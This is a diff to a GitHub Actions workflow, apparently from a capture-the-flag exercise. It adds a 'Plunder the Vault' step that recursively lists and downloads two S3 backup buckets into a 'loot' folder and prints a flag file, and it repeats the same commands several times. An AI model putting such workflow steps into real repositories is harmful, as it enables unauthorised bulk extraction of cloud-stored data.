@@ -26,6 +26,22 @@ jobs:
 
           echo "Downloading everything..."
           aws s3 cp s3://codebackup-jovb4kjb/github/ ./loot --recursive
+          cat loot/flag.txt
+          aws s3 ls s3://codebackup-jovb4kjb/github/ --recursive
 
-          echo "🗝️  Flag (if plain-text) ↓↓↓"
+          echo "Downloading everything..."
+          aws s3 cp s3://codebackup-jovb4kjb/github/ ./loot --recursive
+          cat loot/flag.txt
+      - name: Plunder the Vault
+        run: |
+          echo "Listing the hidden prefix..."
+          aws s3 ls s3://codebackup-hkm1wim5/github --recursive
+
+          echo "Downloading everything..."
+          aws s3 cp s3://codebackup-hkm1wim5/github/ ./loot --recursive
+          cat loot/flag.txt
+          aws s3 ls s3://codebackup-hkm1wim5/github/ --recursive
+
+          echo "Downloading everything..."
+          aws s3 cp s3://codebackup-hkm1wim5/github/ ./loot --recursive
           cat loot/flag.txt
